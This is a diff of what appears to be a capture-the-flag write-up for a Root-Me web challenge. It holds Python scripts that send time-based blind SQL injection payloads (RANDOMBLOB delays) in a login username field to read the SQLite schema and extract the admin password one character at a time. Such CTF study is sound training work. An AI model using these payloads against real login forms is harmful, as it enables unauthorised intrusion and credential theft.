@@ -169,7 +169,7 @@ def query_char(position, char_list):
 tblNameChar = []
 for i in range(32, 127):
     queryTblCharacter = f"v' OR 5407=(case when instr((select group_concat(sql) from sqlite_master where type='table'),'{chr(i)}') then (like('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))) else 5407 end)-- -"
-    payload = {'username': queryTblCharacter, 'password': 'vanir'}
+    payload = {'username': queryTblCharacter, 'password': 'abcdef'}
     start = time.time()
     r = s.post(url, data=payload)
     roundtrip = time.time() - start
@@ -212,40 +212,49 @@ import time
 url = 'http://challenge01.root-me.org/web-serveur/ch10/'
 s = requests.Session()
 
-# Find admin password character set
-passChar = set()
+# Find the possible characters of the password
+pass_chars = []
 for i in range(32, 127):
-    queryPassCharacter = f"v' OR 5407=(CASE WHEN (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='{chr(i)}' THEN (LIKE('a',UPPER(HEX(RANDOMBLOB(200000000/2))))) ELSE 5407 END)-- -"
-    payload = {'username': queryPassCharacter, 'password': 'vanir'}
-    start = time.monotonic()
-    response = s.post(url, data=payload)
-    roundtrip = time.monotonic() - start
+    query_pass_char = f"v' OR 5407=(case when instr((select password from users where username='admin'),'{chr(i)}') then (like('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))) else 5407 end)-- -"
+    payload = {
+        'username': query_pass_char,
+        'password': 'vanir'
+    }
+    start = time.time()
+    r = s.post(url, data=payload)
+    roundtrip = time.time() - start
     if roundtrip > 4:
-        passChar.add(chr(i))
+        pass_chars.append(chr(i))
 
-print(passChar)
+print("Possible characters:", pass_chars)
 
-# Find admin password
-post = 0
+# Find the password using the possible characters
 password = ''
-test = 0
+post = 0
 while True:
     post += 1
-    for i in passChar:
-        queryPass = f"v' OR 5407=(CASE WHEN (SELECT SUBSTR(password,{post},1) FROM users WHERE username='admin')='{i}' THEN (LIKE('a',UPPER(HEX(RANDOMBLOB(200000000/2))))) ELSE 5407 END)-- -"
-        payload2 = {'username': queryPass, 'password': 'vanir'}
-        start = time.monotonic()
-        response = s.post(url, data=payload2)
-        roundtrip = time.monotonic() - start
+    found_char = False
+    for c in pass_chars:
+        query_pass = f"v' OR 5407=(case when substr((select password from users where username='admin'), {post}, 1) = '{c}' then (like('ABCDEFG', UPPER(HEX(RANDOMBLOB(200000000/2))))) else 5407 end)-- -"
+        payload = {
+            'username': query_pass,
+            'password': 'vanir'
+        }
+        start = time.time()
+        r = s.post(url, data=payload)
+        roundtrip = time.time() - start
         if roundtrip > 4:
-            password += i
-            print(password)
+            password += c
+            print(f"Found character {c} at position {post}")
+            found_char = True
             break
-    else:
-        print(password)
+    if not found_char:
         break
+
+print("Admin password:", password)
+
 ```
 
-Thay đổi chính là: Mình sử dụng `time.monotonic()` thay vì `time.time()`
+![image](https://user-images.githubusercontent.com/115911041/235311295-a4631315-7281-4ba3-afb7-eefc3d956ba1.png)
 
 
